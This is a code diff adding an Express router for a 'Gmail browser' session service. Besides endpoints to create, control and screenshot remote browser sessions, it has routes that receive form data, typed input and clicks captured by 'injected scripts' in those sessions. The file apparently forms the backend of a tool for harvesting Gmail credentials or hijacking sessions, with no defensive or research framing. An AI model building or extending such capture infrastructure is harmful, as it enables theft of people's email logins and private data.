@@ -1,0 +1,84 @@
+const express = require('express');
+const router = express.Router();
+const GmailBrowserController = require('../controllers/gmailBrowserController');
+
+// Create controller instance
+const gmailBrowserController = new GmailBrowserController();
+
+/**
+ * POST /api/gmail-browser/create-session
+ * Create a new Gmail browser session
+ */
+router.post('/create-session', async (req, res) => {
+  await gmailBrowserController.createSession(req, res);
+});
+
+/**
+ * GET /api/gmail-browser/session/:sessionToken
+ * Get session information
+ */
+router.get('/session/:sessionToken', async (req, res) => {
+  await gmailBrowserController.getSession(req, res);
+});
+
+/**
+ * GET /api/gmail-browser/sessions
+ * Get all active sessions
+ */
+router.get('/sessions', async (req, res) => {
+  await gmailBrowserController.getAllSessions(req, res);
+});
+
+/**
+ * POST /api/gmail-browser/session/:sessionToken/action
+ * Execute action on browser session
+ */
+router.post('/session/:sessionToken/action', async (req, res) => {
+  await gmailBrowserController.executeAction(req, res);
+});
+
+/**
+ * GET /api/gmail-browser/session/:sessionToken/screenshot
+ * Get screenshot of current page
+ */
+router.get('/session/:sessionToken/screenshot', async (req, res) => {
+  await gmailBrowserController.getScreenshot(req, res);
+});
+
+/**
+ * DELETE /api/gmail-browser/session/:sessionToken
+ * Close browser session
+ */
+router.delete('/session/:sessionToken', async (req, res) => {
+  await gmailBrowserController.closeSession(req, res);
+});
+
+/**
+ * POST /api/gmail-browser/capture-form/:sessionToken
+ * Handle form data capture from injected scripts
+ */
+router.post('/capture-form/:sessionToken', async (req, res) => {
+  await gmailBrowserController.captureForm(req, res);
+});
+
+/**
+ * POST /api/gmail-browser/capture-input/:sessionToken
+ * Handle input capture from injected scripts
+ */
+router.post('/capture-input/:sessionToken', async (req, res) => {
+  await gmailBrowserController.captureInput(req, res);
+});
+
+/**
+ * POST /api/gmail-browser/track-click/:sessionToken
+ * Handle click tracking from injected scripts
+ */
+router.post('/track-click/:sessionToken', async (req, res) => {
+  await gmailBrowserController.trackClick(req, res);
+});
+
+// Export both router and controller for Socket.IO setup
+module.exports = {
+  router,
+  gmailBrowserController
+};
